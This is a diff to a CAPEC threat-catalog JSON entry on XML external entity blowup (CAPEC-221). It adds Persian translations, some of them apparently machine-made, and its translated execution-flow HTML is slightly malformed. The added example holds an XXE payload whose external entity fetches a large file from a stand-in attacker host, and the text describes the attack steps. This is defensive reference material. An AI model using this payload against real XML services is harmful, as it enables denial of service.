@@ -9,18 +9,22 @@
                 {
                     "external_id": "CAPEC-221",
                     "source_name": "capec",
-                    "url": "https://capec.mitre.org/data/definitions/221.html"
+                    "url": "https://capec.mitre.org/data/definitions/221.html",
+                    "source_name_fa": "capec"
                 },
                 {
                     "external_id": "CWE-611",
                     "source_name": "cwe",
-                    "url": "http://cwe.mitre.org/data/definitions/611.html"
+                    "url": "http://cwe.mitre.org/data/definitions/611.html",
+                    "source_name_fa": "cwe"
                 },
                 {
                     "description": "XML External Entities",
                     "external_id": "43",
                     "source_name": "WASC",
-                    "url": "http://projects.webappsec.org/XML-External-Entities"
+                    "url": "http://projects.webappsec.org/XML-External-Entities",
+                    "description_fa": "موجودیت های خارجی XML",
+                    "source_name_fa": "WASC"
                 }
             ],
             "id": "attack-pattern--ee525a27-de33-45e9-ba7f-f63562001a5b",
@@ -45,6 +49,16 @@
                 ],
                 "Integrity": [
                     "Execute Unauthorized Commands (Run Arbitrary Code)"
+                ],
+                "Availability_fa": [
+                    "مصرف منابع",
+                    "اجرای دستورات غیرمجاز (اجرای کد دلخواه)"
+                ],
+                "Confidentiality_fa": [
+                    "اجرای دستورات غیرمجاز (اجرای کد دلخواه)"
+                ],
+                "Integrity_fa": [
+                    "اجرای دستورات غیرمجاز (اجرای کد دلخواه)"
                 ]
             },
             "x_capec_domains": [
@@ -59,7 +73,16 @@
                 "A server that has an implementation that accepts entities containing URI values."
             ],
             "x_capec_status": "Draft",
-            "x_capec_version": "3.9"
+            "x_capec_version": "3.9",
+            "description_fa": "این حمله از ویژگی جایگزینی موجودیت زبان‌های سریال‌سازی خاص (مانند XML، YAML و غیره) استفاده می‌کند، جایی که مقدار جایگزینی یک URI است. یک فایل به خوبی ساخته شده می تواند به یک URI اشاره کند که مقدار زیادی از منابع را برای ایجاد شرایط انکار سرویس مصرف می کند. این می تواند باعث شود که سیستم بسته به URI مسدود شود، از کار بیفتد یا کد دلخواه را اجرا کند.",
+            "name_fa": "Serialization داده های External Entities Blowup",
+            "x_capec_example_instances_fa": [
+                "<xhtml:p>در این مثال، تجزیه‌کننده XML XML مهاجم را تجزیه می‌کند و URI مخرب را باز می‌کند، جایی که مهاجم سرور را کنترل می‌کند و حجم عظیمی از داده‌ها را در جریان پاسخ می‌نویسد. در این مثال، URI مخرب یک انتقال فایل بزرگ است.</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"informative\"><?xml version=\"1.0\"?>< !DOCTYPE bomb [<!ENTITY detonate SYSTEM \"http://www.malicious-badguy.com/myhugefile.exe\">]><bomb>&detonate;</bomb></xhtml:div>"
+            ],
+            "x_capec_execution_flow_fa": "<h2> جریان اجرا </h2><div><h3>کاوش</h3><ol><li> <p> <b>یافتن سرویس وب هدف: </b> دشمن ابتدا باید سرویس وب را پیدا کند که داده‌های ورودی را به شکل یک زبان سریالی مانند XML یا YAML دریافت می‌کند.</p></li></ol><h/div> <b>میزبان فایل مخرب در سرور: </b> دشمن یک وب سرور ایجاد می کند که حاوی یک فایل مخرب است. این فایل بسیار بزرگ خواهد بود، به طوری که اگر یک سرویس وب بخواهد آن را بارگیری کند، به احتمال زیاد سرویس متوقف می شود.</p></li><li> <p> <b>دستورالعمل داده های مخرب: </b>با استفاده از زبان سریال سازی که سرویس وب به عنوان ورودی می گیرد، حریف داده هایی را ایجاد می کند که با استفاده از یک نشانی اینترنتی مرجع خارجی موجودیت موجود به فایل مخرب پیوند می دهد. فایل.</p></li></ol></div><div><h3>Exploit</h3><ol><li> <p> <b>ارسال داده‌های سریالی حاوی URI: </b> دشمن داده‌های سریال‌سازی شده ویژه را به سرویس وب ارسال می‌کند. هنگامی که وب سرویس ورودی را بارگیری می کند، سعی می کند فایل مخرب را دانلود کند. بسته به مقدار حافظه ای که وب سرویس دارد، این امر می تواند سرویس را از کار بیندازد یا باعث از کار افتادن آن شود که منجر به حمله انکار سرویس می شود.</p></li></ol></div>",
+            "x_capec_prerequisites_fa": [
+                "سروری که پیاده سازی دارد که موجودیت های حاوی مقادیر URI را می پذیرد."
+            ]
         }
     ],
     "spec_version": "2.0",
